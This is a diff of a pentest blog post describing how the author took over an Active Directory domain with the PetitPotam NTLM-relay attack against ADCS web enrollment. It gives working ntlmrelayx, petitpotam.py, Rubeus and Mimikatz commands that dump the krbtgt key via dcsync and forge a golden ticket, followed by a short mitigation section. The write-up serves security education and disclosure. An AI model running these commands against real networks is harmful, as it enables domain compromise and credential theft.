@@ -70,19 +70,19 @@ Original research was done by <a href="https://twitter.com/harmj0y">Will Schroed
 <p><a href="https://github.com/topotam/PetitPotam">PetitPotam</a> PoC was written by <a href="https://twitter.com/topotam77">Lionel Gilles</a>.</p>
 <p>I still need to conduct more research and experiment to fully understand this attack and the underlying technicalities.</p>
 <h2 id="introduction">Introduction</h2>
-<p>In a recent network pentest, I found an ADCS CA (Active Directory Certificate Services Certificate Authortity) on the target domain. I haven&rsquo;t gotten a chance to play around with ADCS before, but I did remembered reading about one attack technique called <a href="https://github.com/topotam/PetitPotam">PetitPotam</a> that abuses NTLM Relay via ADCS to take over the domain. After some time reading up about the technique and getting my hands dirty, I have successfully compromised DA! This blog post will be a quick rundown of how I got DA using the PetitPotam attack.</p>
+<p>In a recent network pentest, I found an ADCS CA (Active Directory Certificate Services Certificate Authortity) on the target domain. I haven&rsquo;t gotten a chance to play around with ADCS before, but I did remembered reading about one attack technique called <a href="https://github.com/topotam/PetitPotam">PetitPotam</a> that abuses NTLM Relay via ADCS to take over the domain. After some time reading up about the technique and getting my hands dirty, I have successfully compromised DA! This blog post will be a quick rundown of how I got DA using this attack.</p>
 <h3 id="active-directory-certificate-services">Active Directory Certificate Services</h3>
 <p>On a high level, ADCS is a server role in Windows Active Directory that allows users to build a Public Key Infrastructure (PKI). This means that it can provide digital certificates and digital signature capabilities, improving confidentiality via encryption and integrity via digital signatures. The practical applications of ADCS are VPN (Virtual Private Network), IPSec (Internet Protocol Security), EFS (Encrypting File System), Smart Card logon, and more.</p>
 <h3 id="petitpotam">PetitPotam</h3>
-<p>PetitPotam is an attack technique that abuses NTLM Relay via ADCS CA with Web Enrollment enabled by exploiting the MS-EFSRPC (Encrypting File System Remote Protocol). This technique allows an attacker in the internal network to force the Domain Controller (DC) machine account to authenticate towards a machine with NTLM relay configured (my attacker machine). This authentication will then be relayed to the CA Web Enrollment to request for a certificate as the DC. This certificate can be captured and be used to request for a TGT as the DC machine account. With this TGT, we can now use Mimikatz do dump the encryption key of the DC and forge a golden ticket.</p>
+<p>PetitPotam is an attack technique that abuses NTLM Relay via ADCS CA with Web Enrollment enabled by exploiting the MS-EFSRPC (Encrypting File System Remote Protocol). This technique allows an attacker in the internal network to force the Domain Controller (DC) machine account to authenticate towards a machine with NTLM relay configured (the attacker machine). This authentication will then be relayed to the CA Web Enrollment to request for a certificate as the DC. This certificate can be captured and be used to request for a TGT as the DC machine account. With this TGT, Mimikatz can be used to dump credentials of the DA or the krbtgt account to fully compromise the Active Directory environment.</p>
 <h2 id="action">Action</h2>
-<p>From the foothold domain machine, I did some enumeration and was able to locate a CA in the domain. We can use the native Windows tool <code>certutil.exe</code> for this or <a href="https://github.com/GhostPack/Certify">Certify</a>. Certify is a C# tool to enumerate and abuse misconfigurations in ADCS, I also used this to look for vulnerable certificate templates. Misconfiguration in certificate templates can lead to privilege escaltion, unfortunately, I did not find any.
+<p>From the foothold domain machine, I did some enumeration and was able to locate a CA in the domain. A native Windows tool called <code>certutil.exe</code> or <a href="https://github.com/GhostPack/Certify">Certify</a> can be used for this purpose. Certify is a C# tool to enumerate and abuse misconfigurations in ADCS, this tool can also be used to look for vulnerable certificate templates. Misconfiguration in certificate templates can lead to privilege escaltion, unfortunately, no vulnerable template was identified.
 
     <img src="/images/CA_.png"  alt="CA"  class="left"  style="border-radius: 8px;"  />
 
 
 <em>Identified CA</em></p>
-<p>Now I&rsquo;ve got the domain name for the CA Web Enrollment Interface at <code>https://ca-hostname/certsrv</code>, I could just access this and request for a certificate to get a <code>certfnsh.asp</code>.
+<p>Now I&rsquo;ve got the domain name for the CA Web Enrollment Interface at <code>https://ca-hostname/certsrv</code>, I was able to access this domain and request for a certificate to get a <code>certfnsh.asp</code>.
 
     <img src="/images/CA_WebE.png"  alt="CA Web Enrollment"  class="left"  style="border-radius: 8px;"  />
 
@@ -93,13 +93,13 @@ Original research was done by <a href="https://twitter.com/harmj0y">Will Schroed
 
 
 <em>Generated certfnsh.asp</em></p>
-<p>With this, I was able to launch my ADCS Relay attack.</p>
+<p>With this, I was able to launch the ADCS Relay attack.</p>
 <p>From the attacker box, launch <code>ntlmrelayx.py</code>:</p>
 <pre tabindex="0"><code>ntlmrelayx.py -debug -smb2support --target https://ca-hostname/certsrv/certfnsh.asp --adcs --template domaincontroller
 </code></pre><p>The <code>--template</code> argument would depend on the account that would be relayed. Since I was relaying a DC, then the template should be <code>domaincontroller</code>, you could enumerate the template on the ADCS using Certify: <code>Certify.exe cas</code></p>
 <p>On another window on the attacker box, launch <a href="https://github.com/topotam/PetitPotam">PetitPotam</a> against the DC:</p>
 <pre tabindex="0"><code>sudo python3 petitpotam.py &lt;Attack box&#39;s IP&gt; &lt;DC&#39;s IP&gt;
-</code></pre><p>The attack was successful and on the ntlmrelayx window, I have got a Base64 encoded certificate of the DC machine account:
+</code></pre><p>The attack was successful, and on the ntlmrelayx window, a Base64 encoded certificate of the DC machine account was captured:
 
     <img src="/images/b64cert.png"  alt="certfnsh.asp"  class="left"  style="border-radius: 8px;"  />
 
@@ -107,18 +107,19 @@ Original research was done by <a href="https://twitter.com/harmj0y">Will Schroed
 <em>Base64 certificate of DC$</em></p>
 <p>From here, I proceeded with requesting for a TGT of DC$ using <code>Rubeus</code>:</p>
 <pre tabindex="0"><code>Rubeus.exe asktgt /user:DC$ /domain:&lt;domain&gt; /certificate:&lt;base64-certificate&gt; /ptt
-</code></pre><p>With the <code>/ptt</code> option, the returned TGT would be imported into my current user session. With the TGT of DC$, I have accquired DA privilege in the environment.
+</code></pre><p>With the <code>/ptt</code> option, the returned TGT of DC$ would be imported into my current user session.
 <br>
-From here, a threat actor could easily forge a golden ticket to achieve complete Domain Dominance:
+From here, a threat actor aim for the highest prize by dumping the AES256 encryption key of the krbtgt account to forge a Golden Ticket:
 Launch Mimikatz and dump the AES256 encryption key:</p>
 <pre tabindex="0"><code># From mimikatz:
 lsadump::dcsync /domain:&lt;domain&gt; /user:krbtgt
-</code></pre><p>Once grabbed the AES256 encryption key of the krbtgt account, the golden ticket could be forged:</p>
+</code></pre><p>Once the AES256 encryption key of the krbtgt account was captured, the Golden Ticket could be forged:</p>
 <pre tabindex="0"><code># From Mimikatz:
 kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:&lt;SID of the domain&gt; /aes256:&lt;aes256 key&gt; /ticket:goldie.kirbi
 </code></pre><p>Proceeded to inject the golden ticket:</p>
 <pre tabindex="0"><code>Rubeus.exe ptt /ticket:goldie.kirbi
-</code></pre><h2 id="mitigation">Mitigation</h2>
+</code></pre><p>GG!</p>
+<h2 id="mitigation">Mitigation</h2>
 <p>The misconfiguration has been mitigated immediately by enabling Extended Protection for Authentication (EPA) for CA Web Enrollment and Certificate Enrollment Web Service.</p>
 <p>Addition mitigations that are recommended by Microsoft are:</p>
 <ul>
